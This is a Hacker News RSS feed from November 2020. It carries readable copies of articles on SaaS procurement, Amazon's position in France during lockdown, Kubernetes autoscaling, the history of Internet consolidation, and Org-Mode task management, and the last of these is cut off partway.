<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 1]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 1. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Sun, 15 Nov 2020 12:26:07 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-1.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Sun, 15 Nov 2020 12:26:07 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[SaaS Needs a Single Point of Purchase]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25081711">thread link</a>) | @alangibson
<br/>
November 13, 2020 | https://landshark.io/2020/11/13/saas-needs-a-single-point-of-purchase.html | <a href="https://web.archive.org/web/*/https://landshark.io/2020/11/13/saas-needs-a-single-point-of-purchase.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div href="/2020/11/13/saas-needs-a-single-point-of-purchase.html">
	<h2>SaaS Needs a Single Point of Purchase</h2>
</div><div>
	<p>The unassailable advantage that big cloud providers like AWS and Azure have over the rest of the SaaS industry isn’t their quality or pace of innovation; it’s that they’re a single point of purchase for a variety of services. If there was a single vendor that large corporations could contract with and pay for SaaS, the big cloud providers market share would have hit its peak.</p>

<p>I can’t overstate the importance of purchasing mechanics in the decision of what SaaS to use inside large corporations. Because of the arcane and complex purchasing requirements you run into, the simple act of buying software is incredibly difficult and time consuming. People who’ve never worked in a BigCo often don’t realize what an unspeakable nightmare it can be. Because, you see, one does not simply put it on the credit card.</p>

<h2 id="a-series-of-unfortunate-events">A Series of Unfortunate Events</h2>

<p>I once spent <em>5 months</em> licensing Jira. We first had to get a quote, even though it’s fixed price, because Purchasing’s rules said you have to have a quote. After we got the quote, we realized we had no way to pay Atlassian because they don’t take POs and we didn’t pay any way but PO. Putting software on your corporate credit card was explicitly forbidden. So we had to engage a reseller to act as an intermediary for no other reason that they could pay with a credit card. Of course they then had to get another quote that eventually expired due to their general incompetence. Rinse and repeat for several more months until we finally got access.</p>

<p>We never licensed another SaaS product, though we had plenty of budget for it. Anything we need, we made it work on AWS tough we’d rather not have the maintenance hassle. We use open source when we’d be willing and able to license a tool simply because no one can bring themselves to relive the Jira nightmare.</p>

<h2 id="a-solution">A Solution</h2>

<p>The SaaS industry needs is a go-to biller where teams inside large corporations could license software under a standing PO. To the company, the entire SaaS industry would then look like a single vendor with many products for sale (just like AWS). Teams would no longer have to think long and hard about whether some new SaaS tool was worth putting the effort in to license, because I can tell you the answer usually ends up being ‘Buh, just make it work with AWS.’</p>

<p>I know there are already aggregators like App Sumo. However, they tend to be based more around bargains. Large companies will certainly take a deal, but it’s not a major driver for them. We paid that reseller I mentioned an extra <em>25%</em> just to use their Visa card.</p>

<p>Obviously this is a big ask. It would require a lot of major players to sign on before even launching. Maybe a non-profit SaaS consortium could make it work. What do you think? Madness or genius?</p>

<p><a href="https://news.ycombinator.com/item?id=25081711">Hacker News Discussion Thread</a></p>


</div></div>]]>
            </description>
            <link>https://landshark.io/2020/11/13/saas-needs-a-single-point-of-purchase.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25081711</guid>
            <pubDate>Fri, 13 Nov 2020 13:03:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Amazon under fire in France as coronavirus restrictions hit rivals]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25081674">thread link</a>) | @Pick-A-Hill2019
<br/>
November 13, 2020 | https://www.politico.eu/article/spotlight-falls-on-amazon-as-french-businesses-are-restricted-by-lockdown-rules/ | <a href="https://web.archive.org/web/*/https://www.politico.eu/article/spotlight-falls-on-amazon-as-french-businesses-are-restricted-by-lockdown-rules/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
									
<p>Amazon is trying to fend off a wave of criticism in France as small and large businesses, opposition politicians and members of the government accuse the company of unfairly benefiting from lockdown restrictions.</p>



<p>Frédéric Duval, Amazon's country manager for France, went on a media tour Thursday, telling multiple outlets the company was subject to “fantasies” about its allegedly dominant position in e-commerce.</p>



<p>The tour comes after a chorus of attacks from ministers and opposition figures who said that Amazon could benefit from rules banning the selling of "non-essential" items such as books and makeup products in physical stores.</p>



<p>On Monday, Culture Minister Roselyne Bachelot announced that the government would reduce postal fees to <a href="https://minefi.hosting.augure.com/Augure_Minefi/r/ContenuEnLigne/Download?id=2CC3C034-4B93-4D9E-B73D-5FA3F5C86F25&amp;filename=360%20-%20LE%20GOUVERNEMENT%20MET%20EN%20PLACE%20LA%20PRISE%20EN%20CHARGE%20DES%20FRAIS%20D%E2%80%99EXP%C3%89DITION%20DE%20LIVRES%20DES%20LIBRAIRIES%20IND%C3%89PENDANTES.pdf" target="_blank">facilitate</a> ordering from local bookshops. “Amazon is gorging itself. It’s up to us to not feed it,” she said. </p>



<p>Paris Mayor Anne Hidalgo, who has argued for keeping bookstores open, called for a boycott of the American company.</p>



<p>“We’re absolutely not a dominant player,” <a href="https://www.rtl.fr/actu/economie-consommation/confinement-on-n-est-absolument-pas-un-acteur-dominant-assure-le-dg-france-d-amazon-7800917290" target="_blank">Duval told French radio RTL</a>. According to Kantar, Amazon’s share of France's e-commerce market was 22.2 percent last March.</p>



<p>Retailers also partook in the roast. Supermarket chain Intermarché launched full-page newspaper ads on Thursday titled “Sorry, Amazon” to announce it would also <a href="https://www.bfmtv.com/economie/entreprises/desole-amazon-intermarche-lance-un-drive-solidaire-pour-aider-les-petits-commercants_AD-202011050183.html" target="_blank">help small businesses</a> index and sell their products digitally.</p>



<p>But Amazon has also presented offers and training measures to help French businesses sell online — through Amazon, of course. </p>



<p>Duval described these policies in an interview to Le Parisien, insisting that “we are in no way an adversary to the state. Amazon.fr is a French business based in France."</p>



<p><strong>Local opposition</strong></p>



<p>Amazon is also fighting on local fronts. </p>



<p>This week, tensions have flared around the Alsatian town of Ensisheim near Strasbourg, where a planned 190,000-square-meter warehouse is reportedly being built for Amazon.</p>



<p>Duval denied his company had plans for expansion in Alsace. But on Wednesday, the ecologist-led greater metropolitan area of Strasbourg name-checked the company when it joined the opposition to the project, stressing its attachment to “ecological transition."</p>



<p>Pascal Lacombe, spokesman from the Chaudron des Alternatives, a grassroots organization that joined a protest against the construction on Thursday, said: “It’s the Amazon model in its totality that we refuse.” He cited tax avoidance, surges in traffic and lack of local concentration as areas of concern.</p>



<p>One sore spot for Amazon in France has been conditions at its warehouses and conflicts with unions. In the country, where Amazon runs seven warehouses, a <a href="https://www.politico.eu/article/french-court-upholds-order-limiting-amazon-deliveries-amid-coronavirus-risk/">lawsuit brought by unions</a> led to a <a href="https://www.politico.eu/article/amazon-shutdown-in-france-puts-squeeze-on-macron-government/">court defeat for the company in April</a>, prompting the company to shutter all of its France-based operations until at least May 13. The e-commerce giant threatened to take the case to the French supreme court but eventually <a href="https://www.huffingtonpost.fr/entry/amazon-reouverture-progressive-19-mai_fr_5ebeecd5c5b6c9b944f3e941" target="_blank">sealed a deal</a> with unions to reopen at the end of May.</p>



<p id="block-a2bc29c8-fdaa-47cb-a544-0cc3fe127a00">Not everyone is is going after Amazon, however.</p>



<p id="block-a2bc29c8-fdaa-47cb-a544-0cc3fe127a00">During a question-and-answer session in the Senate on Wednesday, Digital Junior Minister Cédric O went to bat for the company, saying: “The French psychosis on Amazon makes no sense. E-commerce is 10 percent of commerce in France; Amazon is 20 percent of e-commerce. There is no European country where Amazon is lower than France."</p>



<p id="block-f2b7805d-af6e-43b0-b7ec-fc47349f416e"><a href="https://www.politico.eu/article/france-reinstates-digital-tax-courting-trade-war/">President Emmanuel Macron's government is aware of the influence of digital giants</a> and has repeatedly criticised the fact that they emerge as the big winners from the crisis during the first wave of coronavirus crisis.&nbsp;</p>



<p id="block-88d90152-de1f-40db-9282-a5d41050ee81">Bercy is backing at the EU level a reform of competition rules to regulate the <a href="https://www.politico.eu/article/digital-services-act-brussels-plan-to-rein-in-big-tech-takes-shape-thierry-breton-margrethe-vestager/">so-called gatekeepers</a>, of which Amazon is a part.&nbsp;</p>



<p><em>Additional reporting by Elisa Braün and Laura Kayali.</em></p>



<p><em>Want more analysis from <span>POLITICO</span>? <span>POLITICO</span> Pro is our premium intelligence service for professionals. From financial services to trade, technology, cybersecurity and more, Pro delivers real time intelligence, deep insight and breaking scoops you need to keep one step ahead. Email <a href="https://www.politico.eu/cdn-cgi/l/email-protection#2151534e61514e4d485548424e0f4454" target="_blank"><span data-cfemail="4333312c03332c2f2a372a202c6d2636">[email&nbsp;protected]</span></a> to request a complimentary trial.</em></p>
								</div></div>]]>
            </description>
            <link>https://www.politico.eu/article/spotlight-falls-on-amazon-as-french-businesses-are-restricted-by-lockdown-rules/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25081674</guid>
            <pubDate>Fri, 13 Nov 2020 12:58:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Understanding Kubernetes Autoscaling – A Primer]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25081447">thread link</a>) | @thechiefio
<br/>
November 13, 2020 | https://thechief.io/c/scaleway/understanding-kubernetes-autoscaling/ | <a href="https://web.archive.org/web/*/https://thechief.io/c/scaleway/understanding-kubernetes-autoscaling/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><p>Kubernetes provides a series of features to ensure your clusters have the right size to handle any type of load. In this blog post, we will look into the different auto-scaling tools provided by Kubernetes and learn the difference between the horizontal pod autoscaler, the vertical pod autoscaler and Kubernetes Nodes autoscaler.</p><p>Developers use Kubernetes to ship faster to their users and respond to their requests as quickly as possible. You design the capacity of your cluster on the estimated load your users will generate on it. But imagine your service went viral, and the number of requests grows faster than you ever imagined. You risk running out of compute resources, your service might slow down, and users may get frustrated.</p><p>When you allocate resources manually, your responses may not be as quick as required by your application's changing needs. This is were Kubernetes Autoscaling comes in: Kubernetes provides multiple layers of autoscaling functionality: Pod-based scaling with the Horizontal Pod Autoscaler and the Vertical Pod Autoscaler, as well as node-based with the Cluster Autoscaler. It automatically scales up your cluster as soon as you need it and scales it back down to its regular size when the load is lower. These layers ensure that each pod and cluster has the right performance to serve your current needs.</p><h3><b>Create Kubernetes clusters in seconds:</b></h3><p><a href="https://console.scaleway.com/register?utm_source=faun&amp;utm_medium=blog&amp;utm_campaign=kubernetes">ðŸ‘‰ Create an account</a></p><h2><b>Kubernetes Architecture</b></h2><p>In Kubernetes, a set of machines for running containerized applications is called <b>Cluster</b>. A cluster contains, at minimum, a <b>Control Plane</b> and one or several <b>Nodes</b>. The control plane maintains the clusters' desired state, such as which applications run on them and which images they use. The nodes are either virtual or physical machines that run the applications and workloads, called <b>Pods</b>. Pods consist of containers that request compute resources such as CPU, Memory, or GPU.</p></div></section><section><div><p><img src="https://static.thechief.io/prod/images/Capture_decran_2020-10-22_a_15.3.width-1024.format-webp.webp" width="1024" height="631" alt="Capture dâ€™eÌ�cran 2020-10-22 aÌ€ 15.38.36.png"></p></div></section><section><div><p>For more information to the different Kubernetes components, refer to our dedicated blog post: <a href="https://blog.scaleway.com/an-introduction-to-kubernetes/"><i>An introduction to Kubernetes</i></a></p><h2><b>Horizontal vs. Vertical Scaling</b></h2></div></section><section><div><p><img src="https://static.thechief.io/prod/images/Capture_decran_2020-10-22_a_15.3.width-1024.format-webp_8dgTO9K.webp" width="1024" height="218" alt="Capture dâ€™eÌ�cran 2020-10-22 aÌ€ 15.39.17.png"></p></div></section><section><div><ul><li><b>Horizontal Scaling</b> means modifying the compute resources of an existing cluster, for example, by adding new nodes to it or by adding new pods by increasing the replica count of pods (Horizontal Pod Autoscaler).</li><li><b>Vertical Scaling</b> means to modify the attributed resources (like CPU or RAM) of each node in the cluster. In most cases, this means creating an entirely new node pool using machines that have different hardware configurations. Vertical scaling on pods means dynamically adjusting the resource requests and limits based on the current application requirements (Vertical Pod Autoscaler).</li></ul><h3><b>Horizontal Pod Autoscaler</b></h3><p>The <a href="https://kubernetes.io/docs/tasks/run-application/horizontal-pod-autoscale/">Horizontal Pod Autoscaler (HPA)</a> is able to scale the number of pods available in a cluster to handle the current computational workload requirements of an application. It determines the number of pods needed based on metrics set by you and applies the creation or deletion of pods based on threshold sets. In most cases, these metrics are CPU and RAM usage, but it is also possible to specify your custom metrics. The HPA checks continuously the CPU and memory metrics generated by the <code>metrics-server</code> installed in the Kubernetes cluster.</p><p>If one of the specified thresholds is met, it updates the number of pod replicas inside the deployment controller. Following the updated number of pod replicas, the deployment controller will scale up or down the number of pods until the number of replicas matches the desired number. In case you want to use custom metrics to define rules on how the HPA handles scaling your pods, your cluster needs to be linked to a time-series database holding the metrics you want to use. Please note that Horizontal Pod Autoscaling can not be applied to objects that can not be scaled like, for example, DaemonSets.</p><h3><b>Vertical Pod Autoscaler</b></h3><p>The <a href="https://github.com/kubernetes/autoscaler/blob/master/vertical-pod-autoscaler/README.md">Vertical Pod Autoscaler (VPA)</a> can allocate more (or less) CPU and memory resources to existing pods to modify the available compute resources for an application. This feature can be useful to monitor and adjust the allocated resources of each pod over its lifetime. The VPA comes with a tool called <i>VPA Recommender</i>, which monitors the current and past resource consumption and use this data to provide recommended CPU and memory resources to be allocated for the containers. The Vertical Pod Autoscaler does not update resource configurations for existing pods. It checks which pods have the correct resource configuration and kills the ones that are not having the recommended configuration so that their controllers can recreate them with the updated configuration.</p><p>When you want to use the HPA and VPA both at the same time to manage your container resources, you may put them in a conflict which each other when using the same metrics (CPU and memory). Both of them will try to solve the situation simultaneously, resulting in a wrong allocation of resources. However, it is possible to use them both if they rely on different metrics. The VPA uses CPU and memory consumption as unique sources to gather the perfect resource allocation, but the HPA can be used with custom metrics so both tools can be used in parallel.</p><h3><b>Kubernetes Nodes Autoscaler</b></h3><p>The Kubernetes Nodes Autoscaler adds or removes nodes in a cluster based on <b>all pods' requested resources</b>. It is possible to define a minimum and a maximum number of nodes available to the cluster from the <a href="https://console.scaleway.com/register?utm_source=faun&amp;utm_medium=blog&amp;utm_campaign=kubernetes">Scaleway Elements console</a>.</p><p>While the Horizontal and Vertical Pod Autoscalers allow you to scale pods, the Kubernetes Node Autoscaler scales your clusters nodes, based on the number of pending pods. The CA checks to see whether there are any pending pods and increases the cluster's size so that these pods can be created. It also deallocates idle nodes to keep the cluster at the optimal size. The Nodes Autoscaler can request to deploy new nodes directly in your pool, within the given resource limits (if any).</p><p><b>Cluster upscaling</b><br>If pods are scheduled for execution, the Kubernetes Autoscaler can increase the number of machines in the cluster to avoid resource shortage. The diagram below illustrates how a cluster can be automatically upscaled:</p></div></section><section><div><p><img src="https://static.thechief.io/prod/images/Capture_decran_2020-10-22_a_15.4.width-1024.format-webp.webp" width="1024" height="674" alt="Capture dâ€™eÌ�cran 2020-10-22 aÌ€ 15.40.40.png"></p></div></section><section><div><p>As illustrated, two pods are scheduled for execution but the current node's compute capacity is reached. The cluster autoscaler automatically scans all nodes for scheduled pods. It requests provision of a new node if three conditions are met:</p><ul><li>Some pods failed to schedule on any of the existing nodes due to insufficient available resources.</li><li>Adding a node with the same specifications as the current ones help to redistribute the load.</li><li>The cluster has not reached the user-defined maximum node count.</li></ul><p>Once the node is deployed and detected by the Kubernetes Control Plane, the scheduler allocates the pending pods to the cluster's new node. In case there are still some pending pods, the autoscaler repeats these steps as often as required.</p><p><b>Cluster downscaling</b><br>The Kubernetes Cluster Autoscaler decreases the number of nodes in a cluster when some are considered not necessary for a pre-defined amount of time. To be considered unnecessary, a node must have low utilization, and all of its important pods can be moved elsewhere without resource shortage. The node scaledown check takes into account the resource requests made by the pods, and if the Kubernetes scheduler decides that the pods can be moved somewhere else, it removes the node from the cluster to optimize resource usage and to reduce costs. If you have defined a minimum number of active nodes in the cluster, the autoscaler will not reduce the number of nodes below this threshold.</p><h2><b>Configuring Autoscaling</b></h2><p>You can configure <b>Cluster Autoscaling</b> directly from your <a href="https://console.scaleway.com/register?utm_source=faun&amp;utm_medium=blog&amp;utm_campaign=kubernetes">Scaleway Elements</a> console.</p><p><b>During Cluster creation:</b><br>To enable Kubernetes Cluster Autoscaling during the creation of a new cluster, head to step 5 in the cluster creation form, toggle the switch, and set the minimum and maximum resources available for your cluster:</p></div></section><section><div><p><img src="https://static.thechief.io/prod/images/Capture_decran_2020-10-22_a_15.4.width-1024.format-webp_qeW7ln8.webp" width="1024" height="452" alt="Capture dâ€™eÌ�cran 2020-10-22 aÌ€ 15.41.40.png"></p></div></section><section><div><p><b>On an existing Cluster:</b></p><ol><li>From your cluster information page, click on the <b>Pools</b> tab and select the pool to modify. Click <b>Edit</b> in the pools drop-down menu to configure the pool:</li></ol></div></section><section><div><p><img src="https://static.thechief.io/prod/images/Capture_decran_2020-10-22_a_15.4.width-1024.format-webp_xc3CXr1.webp" width="1024" height="238" alt="Capture dâ€™eÌ�cran 2020-10-22 aÌ€ 15.43.11.png"></p></div></section><section><p>2. Toggle on the <b>Autoscale the number of nodes</b> switch and set the desired number of minimum and maximum resources available for the pool:</p></section><section><div><p><img src="https://static.thechief.io/prod/images/Capture_decran_2020-10-22_a_15.4.width-1024.format-webp_mpliKry.webp" width="1024" height="1284" alt="Capture dâ€™eÌ�cran 2020-10-22 aÌ€ 15.44.21.png"></p></div></section><section><div><ol><li>Confirm the the modification of the pool by clicking on <b>Update pool.</b></li></ol><h2><b>Conclusion</b></h2><p>You now understand the basics of Kubernetes Autoscaling features and how you can use them to configure your cluster for maximum performances.</p><p>Deploy your first <a href="https://console.scaleway.com/register?utm_source=faun&amp;utm_medium=blog&amp;utm_campaign=kubernetes">Kubernetes Kapsule Cluster</a> directly from your Scaleway console and try out the Autoscaling feature.</p></div></section><section><div><h4><b>Article written by</b></h4><h4><a href="https://medium.com/@olgapetrova_92798"><b>Olga Petrova</b></a></h4><p>Quantum physicist turned Machine Learning engineer. Currently doing AI for @Scaleway, a French cloud provider. <a href="https://www.linkedin.com/in/olga-p-petrova/">Her linkedIn</a>.</p></div></section></div></div>]]>
            </description>
            <link>https://thechief.io/c/scaleway/understanding-kubernetes-autoscaling/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25081447</guid>
            <pubDate>Fri, 13 Nov 2020 12:22:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Origins of the Internet: The Backbone]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25081374">thread link</a>) | @chmaynard
<br/>
November 13, 2020 | https://technicshistory.com/2020/11/13/the-backbone-conclusion/ | <a href="https://web.archive.org/web/*/https://technicshistory.com/2020/11/13/the-backbone-conclusion/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>And so we reach the conclusion of “The Backbone,” my story of the origins of the Internet<a href="#fn1" id="fnref1"><sup>1</sup></a>. We have seen the basic arc of the Internet’s development from the 1960s to the 1990s – nurtured in its youth by the government, given room to grow to fruition by the unravelling of the power of the Bell system, and finally emerging into public view in a frenzy of growth which smothered all potential competitors. Over the course of those decades, users repeatedly co-opted systems built in order to expand and share access to machine resources (time-sharing operating systems, ARPANET, and NSFNET), to use them instead for interpersonal communication – message boards and electronic mail.</p>
<p>In 1995, the National Science Foundation (NSF) successfully extricated itself from the network operations business while preserving a single, unitary Internet, composed of many heterogeneous but interlaced parts – networks owned by a variety of corporations; and websites and other services provided by an even wider variety of participants: hobbyists, local governments, small businesses, and more.</p>
<p>The Internet’s self-image coalesced in these years of its adolescence. It was distributed, decentralized, and decentralizing. Its most vocal proponents argued that its technological structure, which privileged the edges over the center, would replicate itself in new political structures, eroding the foundations of incumbent institutional power and enabling direct, disintermediated communication and market transactions between individuals. Louis Rossetto, editor of <em>Wired</em>, <em>the</em> magazine of the technologically-enlightened, put it this way:</p>
<blockquote>
<p>This new world is characterized by a new global economy which is inherently anti-hierarchical and decentralist, and disrespects national boundaries or the control of politicians and bureaucrats or power mongerers of any; and by a global, networked consciousness that is creating a new kind of democracy for achieving social consensus that is turning the bankrupt electoral politics we are witnessing this year into a dead end. …a global hive mind that is arriving at a new, spontaneous order<a href="#fn2" id="fnref2"><sup>2</sup></a>.</p>
</blockquote>
<p>This set of libertarian ideas found expression in statements repeated and replicated so often that they became a kind of scripture of the Internet: the book of David Clark (“We reject: kings, presidents, and voting. We believe in: rough consensus and running code.”); the book of John Perry Barlow (“Governments of the Industrial World, you weary giants of flesh and steel, I come from Cyberspace, the new home of Mind. ….You are not welcome among us. You have no sovereignty where we gather.”); the book of John Gilmore (“The Net interprets censorship as damage and routes around it.”).</p>
<p>These ideas took root, as I have said, when the Internet remained yet in its adolescent state – simultaneously a single, interconnected system, yet robustly heterogeneous in its structure at every level. Over the following fifteen years, its heterogeneity would diminish, with power over the network and its applications consolidating in a few key corporations<a href="#fn3" id="fnref3"><sup>3</sup></a>.</p>
<h2 id="boom-networks-consolidate">Boom: Networks Consolidate</h2>
<p>As the popularity of the Internet exploded in the second half of the 1990s, a river of capital flowed into Silicon Valley in search of the huge returns promised by the unheard of yearly growth of digital traffic. The theory of the time held that, because of the global reach of the Internet and the power of network effects (e.g., Metcalfe’s Law), the first mover to occupy any given sector of online business would dominate it. According to this doctrine, short-term losses – even on per-unit sales basis – were irrelevant, even desirable. Only growth mattered, because growth could always be turned into profits later, once all potential competitors had dwindled into irrelevance<a href="#fn4" id="fnref4"><sup>4</sup></a>. This encouraged a gold rush mentality among investors, what we would now call FOMO, and attracted large amounts of money to such questionable enterprises as Priceline, Boo, and eToys, despite their evident lack of profitability.</p>
<p>Underneath this highly visible froth of increased application diversity, however, the deep current of network infrastructure flowed in the opposite direction, towards consolidation. The boom in web properties in the second half of the 1990s found its echo in a boom in fiber optic network construction. The telecom carriers, new and old, all wanted a piece of the exponential growth in data traffic promised by the rocket-like rise of the World Wide Web. The incumbent telecommunications carriers, freed from their silos by the 1996 Telecom Act, did not, as might have been hoped, use the opportunity to unleash their claws in all-out competitive battle, cutting profits to the bone to the benefit of their users. Markets may thrive on competition, but firms much prefer monopoly. And so the RBOCs and long-distance carriers, split apart in 1984, re-assembled themselves into giants with tremendous market power. Southwestern Bell absorbed Ameritech, Pacific Telesis, BellSouth, and finally AT&amp;T, and then took the name of that former parent company. Bell Atlantic and NYNEX merged, then acquired GTE<a href="#fn5" id="fnref5"><sup>5</sup></a>, taking on at the same time a new moniker, Verizon. Of the former RBOCs, only US West remained an independent company.</p>
<p>While Southwestern Bell and Bell Atlantc re-assembled the scattered parts of AT&amp;T into a pair of Frankenstein’s monsters, another would-be giant was busy absorbing the various internet service providers that had flourished in the first half of the 1990s. In 1983, Bernie Ebbers, who had made his first fortune as the owner of a dozen hotels, co-founded Long Distance Discount Services (LDDS) to compete in the market newly opened by the AT&amp;T break-up, targeting long-distance service for small and medium-sized businesses. Over the ensuing decade, LDDS acquired a variety of other competitors, achieving fourth place in size among long-distance carriers behind AT&amp;T, MCI, and Sprint. In the first days of the Internet boom, it took on a new name – WorldCom – thus announcing its newly hubristic ambitions. A new, much more extravagant buying spree ensued, using WorldCom’s its bubble-inflated stock to acquire one major network after another. In 1996, it bought Metropolitan Fiber Systems (MFS), which had itself just acquired major Internet provider UUNET. The acquisition of CompuServe’s network infrastructure from H&amp;R block followed in 1997, along with the acquisition of the former NSFNET backbone operator, ANS, from AOL. The biggest purchase of all came in 1998, when WorldCom merged with MCI. After the market crash – and bankruptcy and scandal and prison<a href="#fn6" id="fnref6"><sup>6</sup></a> – Verizon absorbed the wreckage of Bernie Ebbers’ conglomerate in 2006.</p>
<p>Finally, the cable television providers, though more historically localized in ownership than the rest of the telecom business, underwent a similar trend towards consolidation, with acquisitions across previously siloed markets making possible behemoths like Time Warner and Comcast; the latter became simultaneously the largest internet service provider and the largest pay-TV company in the U.S., to say nothing of its media holdings.</p>
<p>And so, by the mid-2000s, the diverse structure of peer networks which had characterized the early Internet in the U.S. had merged into a handful of major providers. At the retail level, as broadband networking replaced dial-up, most consumers had access to only one or two relevant ISPs – their local telephone and cable company – and nationally two companies dominated each of those sectors; Verizon and AT&amp;T on the one hand, and Comcast and Time Warner on the other.</p>
<h2 id="bust-applications-consolidate">Bust: Applications Consolidate</h2>
<p>Many of the first-generation dot-coms might have survived had they been allowed to grow gradually. But the gold rush theory was antithetical to anything but hypergrowth. So, when the crash came, most were caught with huge expenses and excess capacity due to overinvestment, and they quickly collapsed. A vigorous winnowing took place, with a great deal of chaff sifted out and only a few grains of wheat left behind.</p>
<p>Over the following decade, a new much more stable order emerged. Five giant companies came to dominate the application layer of the Internet. Two of them were dot-com era survivors. Google, founded in 1998, had raised the bar on what it meant to be a search engine by extracting ranking information from the structure of the Web and its skein of links, rather than merely from the content of individual pages. Through a series of further innovations and acquisitions, it leveraged its dominance in search into a powerful position in mobile computing, email, streaming video, and, of course, advertising. Amazon, founded as a book retailer in 1994, developed a world-beating logistical operation which it used to undercut competitors on price and delivery speed, then expanded into virtually every retail sector, and finally created a set of tools for hosting third-party applications that defined the new, and very lucrative, business of cloud computing.</p>
<p>Two of the other giants had come of age during the personal computing era, a decade before the commercial Internet. Microsoft took an early lead in the so-called “browser wars” of the mid-90s, but more important long-term was its continued dominance of business software, even as those businesses began to move their operations on-line. Apple Computer, made largely irrelevant in the 1990s by the dominance of Windows, seemed destined to a gradual decline into senescence. But it was rejuvenated by its successes with the iPod and iTunes, and then developed the most profitable mobile computing device to this day, the iPhone.</p>
<p>The final dominant power, Facebook, was the only one to come out of the second wave boom in Internet investment in the second half of the 2000s. It grew rapidly across college campuses before colonizing the wider world, and becoming the primary way that many millions of people keep in touch with people outside their immediate family and close friends. It has since acquired other …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://technicshistory.com/2020/11/13/the-backbone-conclusion/">https://technicshistory.com/2020/11/13/the-backbone-conclusion/</a></em></p>]]>
            </description>
            <link>https://technicshistory.com/2020/11/13/the-backbone-conclusion/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25081374</guid>
            <pubDate>Fri, 13 Nov 2020 12:01:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Org-Mode Workflow: Task Management]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25081372">thread link</a>) | @mromanuk
<br/>
November 13, 2020 | https://whhone.com/posts/org-mode-task-management/ | <a href="https://web.archive.org/web/*/https://whhone.com/posts/org-mode-task-management/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
		<div>
			<div>
			
<main role="main">
	<article>
		<div>
			<p>As mentioned in the <a href="https://whhone.com/posts/from-evernote-to-org-mode/">last post</a>, I switched to Org-Mode.  I kept adjusting my workflow with this new tool and it has been stabilized for a month. I think it is time to talk about the new workflow for task/time management with Org-Mode. This blog post consists of four parts: the principles, the definitions, the workflows, and finally the implementations.</p>
<h2 id="1-the-principles">1 The Principles</h2>
<p>Principles remain valid no matter what the tool is.</p>
<h3 id="11-do-not-add-tasks-indiscriminately">1.1 Do Not Add Tasks Indiscriminately</h3>
<p>Not every task should go into the system. Avoid filling the system with bullshits and hiding the things that matter. I only add tasks that I really want or need to do.</p>
<p>To clarify<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>, the task management system describled below is not the “inbox” in GTD. I still capture things into my inbox but not all of them will be converted to a task in the task management system (org agenda files) eventually.</p>
<h3 id="12-not-all-tasks-have-to-be-done">1.2 Not All Tasks Have To Be Done</h3>
<p>There are two reasons for this. First, tasks could be deprioritized or even become unnecessary. Second, we have limited time and cannot do everything. We should have an opinion on the priority.</p>
<h3 id="13-reduce-the-number-of-open-loop">1.3 Reduce The Number Of Open Loop</h3>
<p>Open loops are tasks that have been started but not finished. They stay in our minds and occupy some of our limited working memory so that we cannot focus on another task we are working on.</p>
<p>Also, open loops reduce agility, according to <a href="https://en.wikipedia.org/wiki/Little%27s_law">Little’s Law</a>. The more the open loops, the longer time finish each of them on average.</p>
<h3 id="14-reduce-decision-making-of-what-to-do-next">1.4 Reduce Decision Making Of What To Do Next</h3>
<p>The system should suggest to the user what to do next so that the user can reserve the will power to the real task. This also avoids skipping hard tasks with easy tasks unconsciously.</p>
<h2 id="2-the-definitions">2 The Definitions</h2>
<p>Each task in Org-Mode has a <a href="https://orgmode.org/manual/Workflow-states.html">TODO keyword</a>, optionally <a href="https://orgmode.org/manual/Deadlines-and-Scheduling.html">a scheduled date, and a deadline</a>. For example,</p>
<div><pre><code data-lang="org">*<span> PROG Write a blog post on task management with Org-Mode</span>
DEADLINE: &lt;<span>2020-11-07 Sat</span>&gt; SCHEDULED: &lt;<span>2020-10-31 Sat</span>&gt;
</code></pre></div><p>Each Org-Mode user could define their own set of TODO keywords and use scheduled dates and deadlines differently. For example, some people use only two TODO keywords, “TODO” and “DONE”, while some use more. Some people set “scheduled dates” to all the tasks while some people set it to some of the tasks. These nuances could result in a very different workflow, although they are using the same Org-Mode. Let’s take a look at how I use them.</p>
<h3 id="21-todo-keywords">2.1 TODO Keywords</h3>
